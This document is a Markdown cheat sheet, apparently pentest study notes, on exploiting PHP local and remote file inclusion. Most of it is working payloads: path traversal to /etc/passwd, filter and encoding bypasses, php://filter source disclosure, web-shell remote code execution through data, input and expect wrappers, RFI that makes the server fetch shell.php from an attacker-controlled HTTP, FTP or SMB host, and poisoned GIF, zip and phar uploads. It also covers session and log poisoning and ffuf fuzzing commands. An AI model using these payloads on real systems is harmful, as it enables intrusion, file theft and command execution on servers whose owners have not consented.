# Basic LFI

## Common readable files on back-end servers

**Windows**

`C:\Windows\boot.ini` 

**Linux**

`/etc/passwd`

## Common example LFI Vulnerability

```
http://SERVER.COM/index.php?lenguage=es.php

http://SERVER.COM/index.php?lenguage=/etc/passwd
```

# Path Traversal

## Absolute Path

**Source Code**

```php
include($_GET['language']);
```

**Payload**

```
http://SERVER.COM/index.php?lenguage=/etc/passwd
```

## Relative Path

**Source Code**

```php
include("./languages/" . $_GET['language']);
```

**Payload (bypass restriction)**

```
http://SERVER.COM/index.php?lenguage=../../../../../etc/passwd
```

# Basic Bypasses

## **Non-Recursive Path Traversal Filters**

**Source Code**

```php
$language = str_replace('../', '', $_GET['language']);
```

**Bypass**

```php
http://SERVER.COM/index.php?lenguage=....//....//....//....//....//etc/passwd
```

## **Encoding**

![lfi_image1.png](../Images/lfi_image1.png)

**Note:** For this to work we must URL encode all characters, including the dots. Some URL encoders may not encode dots as they are considered to be part of the URL scheme.

**Note 2:** If this bypass mechanism does not work, it is always a good idea trying with double encoding.

## **Approved Paths**

**Source Code**

```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```

**Payload**

```php
http://SERVER.COM/index.php?lenguage=lenguages/../../../etc/passwd
```

## **Appended Extension**

### Path Truncation

```bash
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done 
```

### **Null Bytes**

**Payload**

```bash
/etc/passwd%00.php
```

# PHP Wrappers and Filters

## **Source Code Disclosure**

### base64

```bash
php://filter/read=convert.base64-encode/resource=config
```

![lfi_image2.png](../Images/lfi_image2.png)

**Decoding the String**...

```php
echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d

...SNIP...

if ($_SERVER['REQUEST_METHOD'] == 'GET' && realpath(__FILE__) == realpath($_SERVER['SCRIPT_FILENAME'])) {  header('HTTP/1.0 403 Forbidden', TRUE, 403);
  die(header('location: /index.php'));
}

...SNIP...
```

## Data Wrapper

### **Checking PHP Configurations**

**Apache config Path**

`/etc/php/X.Y/apache2/php.ini`

**Nginx config path**

`/etc/php/X.Y/fpm/php.ini`) 

where `X.Y` is your install PHP version. 

```php
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

Then…

```
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```

If this option is enabled, it is possible use the `data` wrapper

### **Remote Code Execution using data wrapper**

Encoding Basic PHP webshell

```
echo '<?php system($_GET["cmd"]); ?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

Using curl

```
 curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
 
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Input Wrapper

```bash
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid            

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## **Expect Wrapper**

### **Checking PHP Configurations**

**Apache config Path**

`/etc/php/X.Y/apache2/php.ini`

**Nginx config path**

`/etc/php/X.Y/fpm/php.ini`) 

where `X.Y` is your install PHP version. 

```php
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

Then…

```bash
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect

extension=expect
```

If this option is enabled, it is possible use the `expect` wrapper

### **Remote Code Execution using Exact wrapper**

```
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# Remote File Inclusion (RFI)

## Test RFI

```bash
http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
```

## **Remote Code Execution with RFI**

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

**Note:** It is a good idea to listen on a common HTTP port like `80` or `443`, as these ports may be whitelisted in case the vulnerable web application has a firewall preventing outgoing connections

### **HTTP**

```
sudo python3 -m http.server <LISTENING_PORT>
Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...
```

Then…

```bash
http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```

### **FTP**

```
sudo python -m pyftpdlib -p 21
[SNIP] >>> starting FTP server on 0.0.0.0:21, pid=23686 <<<
[SNIP] concurrency model: async
[SNIP] masquerade (NAT) address: None
[SNIP] passive ports: None
```

Then…

```bash
http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
```

If the server requires valid authentication, then the credentials can be specified in the URL, as follows:

```bash
http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id
```

### **SMB**

If the vulnerable web application is hosted on a Windows server (which we can tell from the server version in the HTTP response headers), then we do not need the `allow_url_include` setting to be enabled for RFI exploitation, as we can utilize the SMB protocol for the remote file inclusion.

```
impacket-smbserver -smb2support share $(pwd)

Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Then…

```bash
http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```

# **LFI and File Uploads**

## **Image upload**

### **Crafting Malicious Image**

```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

Now, we need to upload our malicious image file.

### **Uploaded File Path**

```bash
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
```

**Note:** To include to our uploaded file, we used `./profile_images/` as in this case the LFI vulnerability does not prefix any directories before our input. In case it did prefix a directory before our input, then we simply need to `../` out of that directory and then use our URL path

## **Zip Upload**

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

**Note:** Even though we named our zip archive as (shell.jpg), some upload forms may still detect our file as a zip archive through content-type tests and disallow its upload, so this attack has a higher chance of working if the upload of zip archives is allowed.

### Using ZIP Wrapper

```bash
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

## **Phar Upload**

To do so, we will first write the following PHP script into a `shell.php` file:

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

Compile it into a `phar` file and rename it to `shell.jpg` as follows:

```bash
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

### Using Phar Wrapper

```bash
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

# **Log Poisoning**

## **PHP Session Poisoning**

### Paths where sessions are located

**Linux**

`/var/lib/php/sessions/`  

**Windows**

`C:\Windows\Temp\`

Note: The name of the file that contains our user's data matches the name of our `PHPSESSID` cookie with the `sess_` prefix. For example, if the `PHPSESSID` cookie is set to `el4ukv0kqbvoirg7nkp4dncpk3`, then its location on disk would be `/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3`.

### 1.- Check our PHPSESSID Cookie

first check if we have a `PHPSESSID` cookie set to our session

### 2.- Load the session path using LFI

```bash
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```

![lfi_image3.png](../Images/lfi_image3.png)

For example: The session file contains two values: `page`, which shows the selected language page, and `preference`, which shows the selected language. The `preference` value is not under our control, as we did not specify it anywhere and must be automatically specified. However, the `page` value is under our control, as we can control it through the `?language=` parameter.

### 3.- Change the value of a parameter that you can control

```bash
http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
```

### 4.- Load the session path using LFI and check the changes

```bash
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```

![lfi_image4.png](../Images/lfi_image4.png)

The session file contains `session_poisoning` instead of `es.php`, which confirms our ability to control the value of `page` in the session file.

### 5.- Poisonning the PHPSESSID

```bash
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

### 6.-  Include the session file and use the `&cmd=id` to execute a commands

```bash
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```

## **Server Log Poisoning**

### access.log file path (Apache)

Linux: `/var/log/apache2/` 

Windows: `C:\xampp\apache\logs\`

### access.log file path (Nginx)

Linux: `/var/log/nginx/` 

Windows: `C:\nginx\log\`

### 1.- Include and check access.log file

```bash
http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
```

![lfi_image5.png](../Images/lfi_image5.png)

The log contains the `remote IP address`, `request page`, `response code`, and the `User-Agent` header.

### 2.- Intercept the request using Burp Suite

Modify the `User-Agent` header to `Apache Log Poisoning`

![lfi_image6.png](../Images/lfi_image6.png)

### 3.- Poison the `User-Agent` header using a simple web shell

![lfi_image7.png](../Images/lfi_image7.png)

we may also poison the log by sending a request through cURL

```bash
curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
```

### 4.- Execute a command using cmd parameter

![lfi_image8.png](../Images/lfi_image8.png)

**Note:**  The `User-Agent` header is also shown on process files under the Linux `/proc/` directory. So, we can try including the `/proc/self/environ` or `/proc/self/fd/N` files (where N is a PID usually between 0-50), and we may be able to perform the same attack on these files. This may become handy in case we did not have read access over the server logs, however, these files may
 only be readable by privileged users as well. 

There are other similar log poisoning techniques that we may utilize on various system logs, depending on which logs we have read access over. The following are some of the service logs we may be able to read:

- `/var/log/sshd.log`
- `/var/log/mail`
- `/var/log/vsftpd.log`

We should first attempt reading these logs through LFI, and if we do have access to them, we can try to poison them as we did above. For example, if the `ssh` or `ftp` services are exposed to us, and we can read their logs through LFI, then we can try logging into them and set the username to PHP code, and upon including their logs, the PHP code would execute. The same applies the `mail` services, as we can send an email containing PHP code, and upon its log inclusion, the PHP code would execute. We can generalize this technique to any logs that log a parameter we control and that we can read through the LFI vulnerability.

# **Automated Scanning**

## **Fuzzing Parameters with ffuf**

```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
```

## **LFI wordlists with ffuf**

```
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
```

## **Fuzzing Server Files**

### **Server Webroot**

```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
```

### **Server Logs/Configurations**

```bash
ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
```

LFI-WordList is not part of SecLists

**CHECK THIS PATH (apache configuration)**

`/etc/apache2/apache2.conf`)
